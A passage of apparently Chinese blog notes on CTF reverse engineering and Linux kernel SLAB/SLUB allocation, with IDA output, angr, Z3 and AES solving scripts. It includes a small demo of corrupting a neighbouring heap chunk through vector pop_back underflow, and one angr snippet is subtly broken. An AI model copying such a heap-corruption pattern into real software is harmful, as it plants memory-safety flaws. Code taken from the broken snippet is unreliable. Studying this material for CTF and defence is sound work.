1;\nv18[0] = 2;\nv18[1] = 3;\nv18[2] = 4;\nv19 = 5;\nstd::allocator<int>::allocator(&v10, v7, v8);\nstd::vector<int>::vector<int *,void>(v17, v18, &v19, &v10);\nstd::allocator<int>::~allocator(&v10);\ngetchar();\n```\n\n相关寄存器如下\n\n![image-20220424120944256](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424120944256.png)\n\n栈上的数组模式\n\n![image-20220424121023804](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424121023804.png)\n\n#### ⑤总结\n\n主要就是关注`vector`的构造函数\n\n- 未初始化的只有`vector`构造函数\n\n- 初始化容量或者值的，就会调用`allocator`来为容器进行分配，并且在`vector`的构造函数调用时会从堆上分配空间。\n\n- 在IDA中的`vector`的构造函数中\n\n  - 参数一(RDI寄存器)：即栈上保存`vector`变量的栈地址，指向申请的堆空间地址。后面传入`vector`的析构函数进行销毁。\n\n    ![image-20220424143520190](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424143520190.png)\n\n    其中的Begin和End是有效数据的地址范围，下面的那个地址是该容器申请的堆空间的末尾地址。\n\n  - 参数二(RSI寄存器)：容量+初值模式就传入容量的值，Begin+End模式就传入Begin处的地址。\n\n  - 参数三(RDX寄存器)：容量+初值模式就传入初值的地址，Begin+End模式就传入End处的地址。没有就为`allocator`的参数。\n\n  - 参数四(RCX寄存器)：一般为`allocator`的参数，没有初值的时候就在参数三中。\n\n- 最后会自动调用析构函数，传入构造函数创建时保存堆空间指针的栈地址。\n\n```c\nstd::vector<int>::~vector(v17);\nstd::vector<int>::~vector(v16);\nstd::vector<int>::~vector(v15);\nstd::vector<int>::~vector(v14);\nstd::vector<int>::~vector(v13);\nstd::vector<int>::~vector(v12);\n```\n\n### (2)容器操作\n\n主要关注`push_back`和`pop_back`\n\n- `push_back`：\n\n  - 参数一：栈上保存申请堆空间指针的栈地址\n  - 参数二：要压入`vector`的值\n\n  如果空间超过申请的堆空间大小，会free掉当前堆空间，然后malloc申请比之前大小的两倍减去0x10的大小。比如当前空间为0x50，那么扩容之后就是0x50*2-0x10的大小。\n\n- `pop_back`：\n\n  - 参数：栈上保存申请堆空间指针的栈地址\n\n  只会修改之前提到的End地址，pop完之后如果接着pop则End会接着减少，会小于Begin的地址。\n\n这里就存在漏洞了，就是如果接着pop会导致End不断减少，当小于Begin的地址时，这时候再push_back的话，就会在小于Begin地址处写入数据，导致堆块数据被重写，如下：\n\n```c\nvector<int> test;\nfor(int i=0; i<2; i++)\n    test.push_back(i);\ngetchar();\n\n\nfor(int i=0; i<10; i++)\n    test.pop_back();\ngetchar();\ntest.push_back(0x50);\n```\n\n这样就会导致上一个堆块的数据被覆盖为0x50\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424145337189.png)\n\n此时再`push_back(0x50)`，会如下\n\n![image-20220424145432745](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424145432745.png)\n\n就导致漏洞产生了。\n\n相关的IDA代码如下\n\n```c\nstd::vector<int>::vector(v11, argv, envp);\nfor ( v12[0] = 0; v12[0] <= 1; ++v12[0] )\n    std::vector<int>::push_back(v11, v12);\ngetchar();\nfor ( i = 0; i <= 9; ++i )\n    std::vector<int>::pop_back(v11);\ngetchar();\nv12[0] = 80;\nstd::vector<int>::push_back(v11, v12);\n```\n\n这个还是挺简单的，就不说了。\n\n其他的像`empty()`、`resize()`、`clear()`什么的也是类似的，不多说了。\n\n🔺注\n\n对于类`class`放入`vector`的情况，在`vector`中只会保存对象的成员变量，而它的函数指针并不会保存\n\n![image-20221128143715373](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128143715373.png)\n\n当从容器中取出来时，会通过一个函数来获取对应成员的地址，之后传入对应的函数。\n\n![image-20221128143616124](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128143616124.png)\n\n## 3.容器类list\n\n常见双向循环链表管理\n\n双向循环链表，定义之后栈上只保存头节点地址和尾部节点地址\n\n![image-20221128145817008](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128145817008.png)\n\n每次申请`push_back`加入对象时都会使用`malloc`申请，创建`next、prev`指针，然后拷贝数据，将其放入双向循环链表中\n\n![image-20221128150028794](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128150028794.png)\n\n# 六、控制流去平坦化\n\n[cq674350529/deflat: use angr to deobfuscation (github.com)](https://github.com/cq674350529/deflat)\n\n![image-20211201112020849](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211201112027.png)\n\n\n\n以上类型的就是平坦化之后的，需要找到函数入口进行去除，之后即可得到去除后的\n\n```bash\npython3 deflat.py -f binary --addr 0x400530\n```\n\n\n\n# 七、去混淆\n\n## 1.利用angr\n\n使用代码查找内存，找到混淆的地方，然后通过avoid来去除\n\n```python\nbinary = open('./yolomolo', 'rb').read()\navoids = []\nindex = 0\nwhile True:\n    index = e.find(b'\\xB9\\x00\\x00\\x00\\x00',index+1)\n    if index == -1:\n        break\n    addr = 0x400000 + index\n    avoids.append()\n\nprint (len(avoids))\nprint (avoids)\n```\n\n查找内存中的机器码为`'\\xB9\\x00\\x00\\x00\\x00'`的地方，即`mov ecx 0`，这个为一些混淆的标志。\n\n即找到混淆的标志点，然后通过avoid来去除。\n\n\n\n\n\n# 八、批量修改数据\n\n```python\nfrom idc_bc695 import*\naddr = 0x401807\nfor i in range(0x401823-0x401807):\n    PatchByte(addr +i, Byte(addr+i)^0x90)\n```\n\n\n\n# 九、加密算法\n\n## 1.md5\n\n标识符：0x123456789\n\n常见形式如下\n\n![image-20230728143855425](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230728143855425.png)\n\n\n\n\n\n## 2.AES:\n\n### 加密流程：\n\n![image-AES](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png)\n\n首先轮密钥加(KeyAdd)\n\n9轮循环：字节替换(substitution)、行移位(ShifRow)、列混淆(MixColumn)、轮密钥加(KeyAdd)\n\n第10轮循环：字节替换(substitution)、行移位(ShifRow)、轮密钥加(KeyAdd)\n\n第十轮没有列混淆，加密过程常见如下，函数名称是用Finger识别的\n\n![image-20230728144000135](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230728144000135.png)\n\n### 密钥扩展：\n\n先for循环4次，再for循环40次，属于密钥扩展\n\n![image-20230801110448511](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801110448511.png)\n\n### 判断模式：\n\n如果密文的长度是16字节的整数倍，并且没有任何重复的块，那么可能是CTR或OFB模式3。\n如果密文的长度是16字节的整数倍，并且有重复的块，那么可能是ECB或CBC模式3。ECB模式下，相同的明文块会产生相同的密文块，所以重复的块更容易被发现1。CBC模式下，相同的明文块不一定会产生相同的密文块，因为每个块都与前一个块进行异或操作1。但是如果明文中有大量的零或其他常数值，那么CBC模式下也可能出现重复的块3。\n如果密文的长度不是16字节的整数倍，那么可能是CFB模式3。CFB模式下，可以对任意长度的明文进行加密，而不需要进行填充1。\n参考：https://blog.csdn.net/qq_41853048/article/details/131771420\n\n\n\n## 脚本使用\n\n```python\nimport re\nfrom Crypto.Cipher import AES\nfrom binascii import b2a_hex\n\nmode = AES.MODE_ECB\nkey = b'\\xcb\\x8d\\x49\\x35\\x21\\xb4\\x7a\\x4c\\xc1\\xae\\x7e\\x62\\x22\\x92\\x66\\xce'\ntext = b'\\xBC\\x0A\\xAD\\xC0\\x14\\x7C\\x5E\\xCC\\xE0\\xB1\\x40\\xBC\\x9C\\x51\\xD5\\x2B\\x46\\xB2\\xB9\\x43\\x4D\\xE5\\x32\\x4B\\xAD\\x7F\\xB4\\xB3\\x9C\\xDB\\x4B\\x5B'\ncryptos = AES.new(key, mode)\ncipher_text = cryptos.decrypt(text)\nt = b2a_hex(cipher_text).decode()\nt = re.findall(\".{2}\", t)\nfor x in t:\n    print(chr(int(x, 16)), end=\"\")\n```\n\n\n\n\n\n# 十、Z3求解\n\n几个常见模板\n\n```python\nfrom z3 import *\n \na1 = []\nfor i in range(33):\n    a1.append(BitVec('a1%d' % i, 8))\n\n    \ns = Solver()\ns.add(And((a1[5] ^ (a1[8] * a1[8] - a1[1]) ^ 0x33) == 9600\n    , ((a1[30] + a1[27] + a1[24] + a1[11] - a1[12] - a1[0] * a1[15] * a1[7]) ^ 0x64) == -344791\n    , ((a1[8] + a1[16] * a1[29] * a1[1] - a1[25]) ^ 0x62) == 406716\n    , ((a1[4] - a1[1]) ^ (a1[0] * a1[31] + a1[28] - a1[26]) ^ a1[13] ^ 0x66) == -8688\n    , ((a1[13] + a1[18] + a1[3] * a1[7] - a1[23] - a1[3]) ^ 0x66) == 3085\n    , ((a1[18] - a1[1] * a1[29]) ^ (a1[30] + a1[22] - a1[1]) ^ a1[15] ^ (a1[2] * a1[31]) ^ 0x35) == -16248\n    , ((a1[3] * a1[21] + a1[29] + a1[25] + a1[4] * a1[23] - a1[2] * a1[7] - a1[21]) ^ 0x65) == 4469\n    , ((a1[3] + a1[1] - a1[2]) ^ (a1[23] * a1[23]) ^ 0x61) == 2761\n    , ((a1[5] * a1[11]) ^ (a1[8] * a1[21]) ^ a1[29] ^ 0x39) == 7832 ))\n\ns.add(And(((a1[7] * a1[11] * a1[8] + a1[14]) ^ (a1[10] + 2 * a1[25]) ^ (a1[10] * a1[15]) ^ 0x61) == 234968\n    , (a1[8] ^ (a1[19] + a1[27] + a1[19] * a1[0] + a1[9] * a1[25]) ^ a1[28] ^ a1[7] ^ 0x30) == 11738\n    , ((a1[32] - a1[1]) ^ (a1[28] + a1[14] - a1[2] * a1[21]) ^ a1[21] ^ 0x38) == 3252\n    , ((a1[1] * a1[32]) ^ (a1[8] + a1[0] - a1[5] - a1[11]) ^ a1[21] ^ (a1[2] - a1[12]) ^ 0x32) == -2673\n    , (a1[2] ^ (a1[0] + a1[1]) ^ (a1[6] - a1[19] - a1[22]) ^ 0x64) == -164\n    , ((a1[25] - a1[0]) ^ (a1[28] + a1[4] + a1[31] * a1[31] + a1[2] - a1[32]) ^ 0x30) == -15811\n    , (a1[6] ^ (a1[5] + a1[15] * a1[32] - a1[32] * a1[19] * a1[22]) ^ a1[8] ^ 0x61) == -167332\n    , ((a1[26] + a1[32] * a1[24] - a1[10]) ^ (a1[11] * a1[3] - a1[30] - a1[27] - a1[31]) ^ 0x64) == 3470\n    , ((a1[5] * a1[15]) ^ (a1[18] * a1[25] + a1[14] + a1[2] + a1[26] + a1[27]) ^ a1[29] ^ 0x38) == 4323\n    , ((a1[29] * a1[8] * a1[21] * a1[27] + a1[13] - a1[7]) ^ a1[5] ^ 0x39) == 25234850))\n\n\ns.add(And(((a1[0] * a1[8] * a1[13] + a1[6] + a1[19] * a1[23] - a1[2]) ^ 0x62) == 394534\n    , ((a1[14] + a1[30] + a1[14] - a1[30] - a1[2] * a1[30] * a1[1] * a1[17] - a1[2]) ^ 0x35) == -15531747\n    , ((a1[1] * a1[14]) ^ (a1[13] - a1[27] * a1[32]) ^ 0x33) == -9992\n    , (a1[11] ^ a1[25] ^ a1[12] ^ a1[2] ^ (a1[11] + a1[29] - a1[24]) ^ 0x32) == 117\n    , (a1[2] ^ (a1[20] + a1[0] + a1[8] * a1[6] * a1[8] * a1[0] - a1[19]) ^ 0x62) == 83181080\n    , ((a1[14] * a1[32] + a1[29] + a1[22] - a1[18] - a1[1]) ^ 0x64) == 3243\n    , ((a1[18] - a1[4]) ^ (a1[16] + a1[7]) ^ (a1[14] + a1[18] - a1[7] - a1[14]) ^ 0x65) == -25\n    , ((a1[13] - a1[7]) ^ (a1[2] - a1[13]) ^ (a1[0] - a1[4] - a1[14] - a1[13] - a1[26]) ^ 0x65) == -363\n    , ((a1[1] + a1[10] + a1[7] * a1[14] * a1[7]) ^ (a1[17] + a1[5] * a1[8]) ^ 0x37) == 239501\n    , (a1[5] ^ (a1[15] * a1[24]) ^ 0x61) == 5026))\n\n\ns.add(And((a1[9] ^ (a1[28] * a1[0]) ^ (a1[29] + a1[12] + a1[16]) ^ 0x37) == 7058\n    , ((a1[6] * a1[8] + a1[6]) ^ (a1[18] - a1[7]) ^ 0x65) == 12399\n    , ((a1[12] + a1[8]) ^ (a1[1] - a1[1] * a1[32] * a1[30]) ^ 0x30) == -151548\n    , ((a1[4] + a1[32] * a1[18] + a1[22] - a1[12] - a1[22] - a1[12]) ^ 0x30) == 1624\n    , ((a1[9] * a1[3]) ^ (a1[26] + a1[13]) ^ a1[23] ^ 0x65) == 6569\n    , ((a1[17] - a1[3]) ^ (a1[14] * a1[26] * a1[11] * a1[25]) ^ 0x61) == -24990047\n    , ((a1[22] - a1[0]) ^ (a1[2] - a1[31] - a1[13] - a1[5] - a1[28]) ^ 0x65) == 372\n    , (a1[8] ^ (a1[4] * a1[14] + a1[20] + a1[19] + a1[25] + a1[21] * a1[8] - a1[1]) ^ 0x63) == 13326\n    , ((a1[8] + a1[29] - a1[25] - a1[32]) ^ (a1[24] * a1[4]) ^ 0x62) == 3910\n    , ((a1[2] * a1[15] + a1[27] - a1[30] * a1[29]) ^ 0x37) == 1316))\n\ns.add(And(((a1[5] - a1[2] * a1[24]) ^ (a1[21] - a1[20]) ^ a1[7] ^ 0x64) == 3290\n    , ((a1[9] * a1[15]) ^ (a1[7] - a1[14]) ^ a1[2] ^ 0x37) == -10137\n    , ((a1[5] * a1[6] + a1[26]) ^ (a1[11] + a1[3]) ^ 0x61) == 8601\n    , (a1[3] ^ (a1[8] + a1[16] + a1[27]) ^ (a1[28] + a1[31] * a1[12] + a1[21]) ^ 0x35) == 12752\n    , (a1[2] ^ (a1[6] - a1[20] - a1[8] * a1[9]) ^ (a1[16] + a1[6]) ^ 0x63) == -9964\n    , ((a1[1] * a1[2] * a1[32]) ^ (a1[29] + a1[27]) ^ (a1[1] * a1[18] * a1[8]) ^ 0x35) == 283359))\n\n\nfor i in range(7):\n\ts.add(a1[i] == ord('ESCAPE{'[i]))\n        \nflg = \"\"\nif s.check()==sat:\n    result = s.model()\n    print(result)\n    s.model().sorts()\n    for i in range(33):\n        flg +=  chr(eval(str(s.model().eval(a1[i]))))\n    print(flg)\n```\n\n在s.add中间需要用And(xx,xxx)来进行2个条件联合约束\n\n```python\nfrom z3 import *\n \ns = Solver()\nv1 = Real('v1')\nv2 = Real('v2')\nv3 = Real('v3')\nv4 = Real('v4')\nv5 = Real('v5')\nv6 = Real('v6')\nv7 = Real('v7')\nv8 = Real('v8')\nv9 = Real('v9')\nv11 = Real('v11')\ns.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613)\ns.add(\n    30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400)\ns.add(-103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (\n            v6 * 64) - 120 * v9 == -10283)\ns.add(71 * v6 + (v7 * 128) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855)\ns.add(5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944)\ns.add(-54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222)\ns.add(-83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258)\ns.add(81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559)\ns.add(101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308)\ns.add(99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697)\nif s.check() == sat:\n    result = s.model()\nprint(result)\n```\n\n\n\n# TIPS\n\n## 1.windows的API手册\n\n[Windows API 索引 - Win32 apps | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows/win32/apiindex/windows-api-list)\n\n## 2.IDA-python\n\n## 3.GDB转储调试\n\n- 生成：`generate-core-file`生成`core`文件\n- 调试：`gdb programer core_file`\n\n\n\n## 4.Unity游戏逆向\n\nhttps://www.52pojie.cn/thread-495115-1-1.html\n\n\n\n\n\n## 5.最长反编译修改\n\n有时候当一个函数太长，就会导致IDA反编译失败，如下所示\n\n![image-20230726151414182](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230726151414182.png)\n\n这个可以通过设置IDA目录下的hexrays.cfg配置文件来设置最大反编译的代码长度，如下，将MAX_FUNCSIZE修改为1024即可\n\n![image-20230726151344840](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230726151344840.png)\n\n\n\n\n\n\n\n## 6.安卓Unity\n\n核心逻辑一般在bin\\Data\\Managed\\Assembly-CSharp.dll，题目为[MRCTF2020]PixelShooter\n\n\n\n\n\n## 7.C#/.Net反编译\n\n可以用dnspy，在github上有[Releases · dnSpy/dnSpy (github.com)](https://github.com/dnSpy/dnSpy/releases)\n\n题目见：FlareOn1-Bob_Doge，可以调试的\n\n- 右键-转到入口点\n- 开始分析\n\n![image-20230801144313490](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801144313490.png)\n\n![image-20230801144322604](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801144322604.png)\n\n","tags":["逆向"],"categories":["逆向","IDA技巧"]},{"title":"Linux内核内存分配笔记","url":"/2023/04/01/kernel内存分配笔记/","content":"\n\n\n\n# 前言\n\n`Linux`内核的内存分配很复杂，单独开篇来慢慢记录。\n\n# SLAB\n\n参考：[linux内存源码分析 - SLAB分配器概述 - tolimit - 博客园 (cnblogs.com)](https://www.cnblogs.com/tolimit/p/4566189.html?utm_source=tuicool&utm_medium=referral)\n\n函数链：\n\n```\nkmem_cache_alloc()->slab_alloc()->__do_cache_alloc()->__cache_alloc()\n```\n\n最终在`__cache_alloc`进行实际的内存分配，在这进行分配分叉点。\n\n```c\n//v5.8 /mm/slab.c\nstatic inline void *____cache_alloc(struct kmem_cache *cachep, gfp_t flags)\n{\n\tvoid *objp;\n    //当前slab描述符的对象缓冲池\n\tstruct array_cache *ac;\n\t//...\n    //获取缓冲池,实际上为对应的\n    //CPU_addr+kmalloc_caches[xx][xx].cpu_cache\n    //这个kmalloc_caches[xx][xx]即为对应大小的slab描述符\n\tac = cpu_cache_get(cachep);\n    //如果存在可用的,就直接进行分配-------freelist式分配\n\tif (likely(ac->avail)) {\n\t\tac->touched = 1;\n        //这里即把avail也当作一个idx进行索引了\n\t\tobjp = ac->entry[--ac->avail];\n\t\tSTATS_INC_ALLOCHIT(cachep);\n\t\tgoto out;\n\t}\n\n\tSTATS_INC_ALLOCMISS(cachep);\n    //不存在的话,则进入另一种分配--------其他缓冲池分配\n\tobjp = cache_alloc_refill(cachep, flags);\n\t/*\n\t * the 'ac' may be updated by cache_alloc_refill(),\n\t * and kmemleak_erase() requires its correct value.\n\t */\n\tac = cpu_cache_get(cachep);\n\nout:\n\t/*\n\t * To avoid a false negative, if an object that is in one of the\n\t * per-CPU caches is leaked, we need to make sure kmemleak doesn't\n\t * treat the array pointers as a reference to the object.\n\t */\n\tif (objp)\n\t\tkmemleak_erase(&ac->entry[ac->avail]);\n\treturn objp;\n}\n```\n\n## 1.本地缓冲池分配\n\n这个就不多说了，依据`CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry`当作一个`array_cache`进行分配，分配一个即将对应的`array_cache.avail`减1。\n\n## 2.其他缓冲池分配\n\n进入`cache_alloc_refill()`函数，还是会有相关的分叉\n\n```c\n//v5.9 /mm/slab.c\nstatic void *cache_alloc_refill(struct kmem_cache *cachep, gfp_t flags)\n{\n\tint batchcount;\n\tstruct kmem_cache_node *n;\n\tstruct array_cache *ac, *shared;\n\tint node;\n\tvoid *list = NULL;\n\tstruct page *page;\n\n\tcheck_irq_off();\n    //获取node节点id和array_cache相关信息\n\tnode = numa_mem_id();\n\tac = cpu_cache_get(cachep);\n\tbatchcount = ac->batchcount;\n  \t//不知道干啥的\n\tif (!ac->touched && batchcount > BATCHREFILL_LIMIT) {\n\t\t/*\n\t\t * If there was little recent activity on this cache, then\n\t\t * perform only a partial refill.  Otherwise we could generate\n\t\t * refill bouncing.\n\t\t */\n\t\tbatchcount = BATCHREFILL_LIMIT;\n\t}\n    //真实的node节点指针\n\tn = get_node(cachep, node);\n    \n    \n\tBUG_ON(ac->avail > 0 || !n);\n    //尝试从共享对象缓冲池shared_entry进行分配\n\tshared = READ_ONCE(n->shared);\n\tif (!n->free_objects && (!shared || !shared->avail))\n\t\tgoto direct_grow;\n\t//相关自旋锁\n\tspin_lock(&n->list_lock);\n\tshared = READ_ONCE(n->shared);\n\t/* See if we can refill from the shared array */\n    //transfer_objects()函数会从共享对象缓冲池shared_entry\n    //转移batchcount个空闲对象到本地缓冲池进行分配\n\tif (shared && transfer_objects(ac, shared, batchcount)) {\n        //为什么设置touched?\n\t\tshared->touched = 1;\n\t\tgoto alloc_done;\n\t}\n\n\t//共享对象缓冲池shared_entry没有空闲对象时,查看\n\t//slabs_partial(部分空闲)链表和slabs_free(全部空闲)链表\n\twhile (batchcount > 0) {\n\t\t/* Get slab alloc is to come from. */\n        //进入实际分配函数\n\t\tpage = get_first_slab(n, false);\n        //如果slabs_partial(部分空闲)链表和slabs_free(全部空闲)链表\n        //都没有则重新分配一个slab及对应空间\n\t\tif (!page)\n\t\t\tgoto must_grow;\n\n\t\tcheck_spinlock_acquired(cachep);\n\n\t\tbatchcount = alloc_block(cachep, ac, page, batchcount);\n\t\tfixup_slab_list(cachep, n, page, &list);\n\t}\n\n//重新分配一个slab\nmust_grow:\n\tn->free_objects -= ac->avail;\nalloc_done:\n\tspin_unlock(&n->list_lock);\n\tfixup_objfreelist_debug(cachep, &list);\n\n\ndirect_grow:\n\tif (unlikely(!ac->avail)) {\n\t\t/* Check if we can use obj in pfmemalloc slab */\n\t\tif (sk_memalloc_socks()) {\n\t\t\tvoid *obj = cache_alloc_pfmemalloc(cachep, n, flags);\n\t\t\tif (obj)\n\t\t\t\treturn obj;\n\t\t}\n\n\t\tpage = cache_grow_begin(cachep, gfp_exact_node(flags), node);\n\n\t\t/*\n\t\t * cache_grow_begin() can reenable interrupts,\n\t\t * then ac could change.\n\t\t */\n\t\tac = cpu_cache_get(cachep);\n\t\tif (!ac->avail && page)\n\t\t\talloc_block(cachep, ac, page, batchcount);\n\t\tcache_grow_end(cachep, page);\n\n\t\tif (!ac->avail)\n\t\t\treturn NULL;\n\t}\n\tac->touched = 1;\n\n\treturn ac->entry[--ac->avail];\n}\n```\n\n\n\n### ①shared缓存池分配\n\n尝试将`kmalloc_caches[xx][xx].node.shared.entry`当作一个`array_cache`进行检测，尝试分配\n\n![image-20220517162554930](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220517162554930.png)\n\n### ②slabs_partial和slabs_free分配\n\n在`get_first_slab()`函数中进行分配，尝试获取一个`slab`页框描述符，依据相关索引，从其中的`page->mapping`开始获取堆块对象`obj`，挨个转移到对应`CPU`的`kmalloc-xx`的`array_cache`（即对应的本地缓冲池中）。\n\n```c\n//v5.9 /mm/slab.c\nstatic struct page *get_first_slab(struct kmem_cache_node *n, bool pfmemalloc)\n{\n\tstruct page *page;\n    \n\tassert_spin_locked(&n->list_lock);\n\tpage = list_first_entry_or_null(&n->slabs_partial, struct page,slab_list);\n\tif (!page) {\n\t\tn->free_touched = 1;\n\t\tpage = list_first_entry_or_null(&n->slabs_free, struct page,\n\t\t\t\t\t\tslab_list);\n\t\tif (page)\n\t\t\tn->free_slabs--;\n\t}\n\tif (sk_memalloc_socks())\n\t\tpage = get_valid_first_slab(n, page, pfmemalloc);\n\n\treturn page;\n}\n```\n\n## 3.重新分配一个slab\n\n上面也提到，进入到`must_grow`即进行`slab`的重新分配，这个着实有点复杂，不是很会，涉及ZONE、NODE什么之类的数据结构，还有NUMA机制之类的。\n\n\n\n# SLUB\n\n参考：[Linux内存管理：slub分配器 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/166649492)\n\n函数链：\n\n```\nkmem_cache_alloc()->slab_alloc()->slab_alloc_node()\n```\n\n从`slab_alloc_node()`函数开始分配\n\n```c\n//v5.9 /mm/slub.c\nstatic __always_inline void *slab_alloc_node(struct kmem_cache *s,\n\t\tgfp_t gfpflags, int node, unsigned long addr)\n{\n\tvoid *object;\n\tstruct kmem_cache_cpu *c;\n\tstruct page *page;\n\tunsigned long tid;\n\tstruct obj_cgroup *objcg = NULL;\n\n    //获取对应的kmem_cache描述符\n\ts = slab_pre_alloc_hook(s, &objcg, 1, gfpflags);\n\tif (!s)\n\t\treturn NULL;\nredo:\n\t//.....\n    //尝试从本地缓冲池进行分配\n\tobject = c->freelist;\n\tpage = c->page;\n\tif (unlikely(!object || !node_match(page, node))) {\n        //本地缓冲池已分配完毕\n        //分配不成功就进入后续的__slab_alloc()函数\n\t\tobject = __slab_alloc(s, gfpflags, node, addr, c);\n\t\tstat(s, ALLOC_SLOWPATH);\n\t} else {\n        //相关SLUB保护的指针运算\n\t\tvoid *next_object = get_freepointer_safe(s, object);\n\t\t//...一大堆检查\n\t}\n    //一大堆检查看不太懂\n\n\treturn object;\n}\n```\n\n## 1.本地缓冲池分配\n\n这个就不说了，直接就是从本地的`kmem_cache_cpu`下`cpu_slab`的`freelist`开始分配，上面的`slab_alloc_node()`函数中也相关体现了。\n\n之后在`__slab_alloc()`函数中进行相关判断后会进入到`___slab_alloc()`函数，进行后续的不同情况判断。不是很懂在干嘛，和`CONFIG_PREEMPTION`配置有关。\n\n```c\n//v5.9 /mm/slub.c\nstatic void *__slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node,\n\t\t\t  unsigned long addr, struct kmem_cache_cpu *c)\n{\n\tvoid *p;\n\tunsigned long flags;\n\n\tlocal_irq_save(flags);\n#ifdef CONFIG_PREEMPTION\n\t/*\n\t * We may have been preempted and rescheduled on a different\n\t * cpu before disabling interrupts. Need to reload cpu area\n\t * pointer.\n\t */\n\tc = this_cpu_ptr(s->cpu_slab);\n#endif\n\n\tp = ___slab_alloc(s, gfpflags, node, addr, c);\n\tlocal_irq_restore(flags);\n\treturn p;\n}\n```\n\n如下，当`cpu_slab->freelist`被分配完毕之后，`cpu_slab->page`也被清空![image-20220519192842119](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519192842119.png)\n\n## 2.`partial`分配\n\n在定义配置时，需要`CONFIG_SLUB_CPU_PARTIAL=y`才会有\n\n进入`___slab_alloc()`函数后，会分为不少情况\n\n```c\nstatic void *___slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node,\n\t\t\t  unsigned long addr, struct kmem_cache_cpu *c)\n{\n\tvoid *freelist;\n\tstruct page *page;\n\t//这个c即为对应kmalloc-xx下的cpu_slab\n    //检查page是否为NULL,如果为NULL代表本地缓冲池的freelist已经分配完毕\n    //那么就会进入到new_slab\n\tpage = c->page;\n\tif (!page) {\n\t\t/*\n\t\t * if the node is not online or has no normal memory, just\n\t\t * ignore the node constraint\n\t\t */\n\t\tif (unlikely(node != NUMA_NO_NODE &&\n\t\t\t     !node_state(node, N_NORMAL_MEMORY)))\n\t\t\tnode = NUMA_NO_NODE;\n\t\tgoto new_slab;\n\t}\nredo:\n    //这里有一些匹配检查,会检查page的nid和node是否能对上\n    //不能对上就不会进行相关分配,接着重来,不太懂\n    //也常常碰上不匹配的partial\n\tif (unlikely(!node_match(page, node))) {\n\t\t/*\n\t\t * same as above but node_match() being false already\n\t\t * implies node != NUMA_NO_NODE\n\t\t */\n\t\tif (!node_state(node, N_NORMAL_MEMORY)) {\n\t\t\tnode = NUMA_NO_NODE;\n\t\t\tgoto redo;\n\t\t} else {\n\t\t\tstat(s, ALLOC_NODE_MISMATCH);\n\t\t\tdeactivate_slab(s, page, c->freelist, c);\n\t\t\tgoto new_slab;\n\t\t}\n\t}\n\n    //.....\n\n\t/* must check again c->freelist in case of cpu migration or IRQ */\n\tfreelist = c->freelist;\n\tif (freelist)\n\t\tgoto load_freelist;\n    \n\tfreelist = get_freelist(s, page);\n\tif (!freelist) {\n\t\tc->page = NULL;\n\t\tstat(s, DEACTIVATE_BYPASS);\n\t\tgoto new_slab;\n\t}\n\tstat(s, ALLOC_REFILL);\n\n    //本地CPU的page被赋值之后,加载freelist的过程\nload_freelist:\n\t/*\n\t * freelist is pointing to the list of objects to be used.\n\t * page is pointing to the page from which the objects are obtained.\n\t * That page must be frozen for per cpu allocations to work.\n\t */\n\tVM_BUG_ON(!c->page->frozen);\n\tc->freelist = get_freepointer(s, freelist);\n\tc->tid = next_tid(c->tid);\n\treturn freelist;\n\n    //这里完成本地CPU的partial寻找以及重新从buddy伙伴中分配slab描述符\nnew_slab:\n    //检查本地CPU的partial是否存在\n\tif (slub_percpu_partial(c)) {\n        //本地CPU的partial则直接赋值给本地CPU的page,进入redo加载freelist\n\t\tpage = c->page = slub_percpu_partial(c);\n  \t\t//对本地CPU刚赋值的page进行相关设置,包括slab_cache等之类的设置\n\t\tslub_set_percpu_partial(c, page);\n\t\tstat(s, CPU_PARTIAL_ALLOC);\n        //跳转redo,依据新的page重新加载freelist\n\t\tgoto 